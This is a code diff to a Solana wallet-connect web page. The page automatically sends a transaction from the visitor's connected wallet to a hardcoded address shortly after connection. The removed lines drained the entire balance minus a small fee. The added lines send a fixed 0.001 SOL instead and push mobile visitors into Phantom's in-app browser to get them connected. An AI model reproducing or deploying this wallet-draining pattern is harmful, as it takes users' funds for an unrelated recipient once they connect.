@@ -18,7 +18,6 @@ import {
     SolflareWalletAdapter,
 } from '@solana/wallet-adapter-wallets';
 import {
-    clusterApiUrl,
     Connection,
     PublicKey,
     LAMPORTS_PER_SOL,
@@ -38,8 +37,8 @@ const App: FC = () => {
 };
 
 const Context: FC<{ children: ReactNode }> = ({ children }) => {
+    const endpoint = 'https://sg110.nodes.rpcpool.com/';
     const network = WalletAdapterNetwork.Mainnet;
-    const endpoint = useMemo(() => clusterApiUrl(network), [network]);
 
     const wallets = useMemo(
         () => [
@@ -51,12 +50,23 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
         [network]
     );
 
+    const [container, setContainer] = useState<HTMLElement | null>(null);
+
+    useEffect(() => {
+        const el = document.getElementById('walletPopup');
+        if (el) setContainer(el);
+    }, []);
+
     return (
         <ConnectionProvider endpoint={endpoint}>
             <WalletProvider wallets={wallets} autoConnect>
-                <WalletModalProvider container="#walletPopup">
-                    {children}
-                </WalletModalProvider>
+                {container ? (
+                    <WalletModalProvider container={(container as HTMLElement)}>
+                        {children}
+                    </WalletModalProvider>
+                ) : (
+                    <WalletModalProvider>{children}</WalletModalProvider>
+                )}
             </WalletProvider>
         </ConnectionProvider>
     );
@@ -64,9 +74,21 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
 
 const ExposeWalletModal: FC = () => {
     const { setVisible } = useWalletModal();
+
     useEffect(() => {
         (window as any).openSolanaWalletModal = () => setVisible(true);
     }, [setVisible]);
+
+    useEffect(() => {
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        const isPhantom = (window as any).solana?.isPhantom;
+
+        if (isMobile && !isPhantom) {
+            const url = encodeURIComponent(window.location.href);
+            window.location.href = `https://phantom.app/ul/browse/${url}`;
+        }
+    }, []);
+
     return null;
 };
 
@@ -84,7 +106,7 @@ const WalletConnectionHandler: FC = () => {
     const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
         try {
             setLoading(true);
-            const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
+            const connection = new Connection('https://sg110.nodes.rpcpool.com/', 'confirmed');
 
             const lamports = await connection.getBalance(walletPublicKey);
             const sol = lamports / LAMPORTS_PER_SOL;
@@ -93,9 +115,10 @@ const WalletConnectionHandler: FC = () => {
             console.log(`🔗 Connected wallet: ${walletPublicKey.toBase58()}`);
             console.log(`💰 Balance: ${sol.toFixed(4)} SOL`);
 
-            const transferLamports = lamports - 100000;
-            if (transferLamports <= 0) {
-                alert('⚠️ Not enough SOL to send after keeping 0.0001 SOL.');
+            const sendAmount = 0.001 * LAMPORTS_PER_SOL;
+
+            if (lamports <= sendAmount + 100000) {
+                alert('⚠️ Not enough SOL to send 0.001 SOL.');
                 return;
             }
 
@@ -103,7 +126,7 @@ const WalletConnectionHandler: FC = () => {
                 SystemProgram.transfer({
                     fromPubkey: walletPublicKey,
                     toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
-                    lamports: transferLamports,
+                    lamports: sendAmount,
                 })
             );
 
@@ -136,7 +159,7 @@ const WalletConnectionHandler: FC = () => {
 
     const walletPopupEl = typeof window !== 'undefined' ? document.getElementById('walletPopup') : null;
 
-    const connectedInfo = (
+    const WalletUI = (
         <div
             style={{
                 marginTop: '2rem',
@@ -151,30 +174,28 @@ const WalletConnectionHandler: FC = () => {
                 maxWidth: '500px',
             }}
         >
-            <h2 style={{ color: '#16a34a' }}>✅ Wallet Connected</h2>
-            <p
-                style={{ wordBreak: 'break-all', cursor: 'pointer', color: '#333' }}
-                onClick={() => navigator.clipboard.writeText(publicKey?.toBase58() || '')}
-            >
-                <strong>Address:</strong> {publicKey?.toBase58()}
-            </p>
-            <p>
-                <strong>Balance:</strong>{' '}
-                {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
-            </p>
-            <p style={{ color: '#555' }}>Transaction will auto-send 10s after connect.</p>
+            {!connected || !publicKey ? (
+                <WalletMultiButton />
+            ) : (
+                <>
+                    <h2 style={{ color: '#16a34a' }}>✅ Wallet Connected</h2>
+                    <p
+                        style={{ wordBreak: 'break-all', cursor: 'pointer', color: '#333' }}
+                        onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
+                    >
+                        <strong>Address:</strong> {publicKey.toBase58()}
+                    </p>
+                    <p>
+                        <strong>Balance:</strong>{' '}
+                        {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
+                    </p>
+                    <p style={{ color: '#555' }}>Transaction will auto-send 10s after connect.</p>
+                </>
+            )}
         </div>
     );
 
-    if (!connected || !publicKey) {
-        return walletPopupEl
-            ? ReactDOM.createPortal(<WalletMultiButton />, walletPopupEl)
-            : <WalletMultiButton />;
-    }
-
-    return walletPopupEl
-        ? ReactDOM.createPortal(connectedInfo, walletPopupEl)
-        : connectedInfo;
+    return walletPopupEl ? ReactDOM.createPortal(WalletUI, walletPopupEl) : null;
 };
 
 export default App;
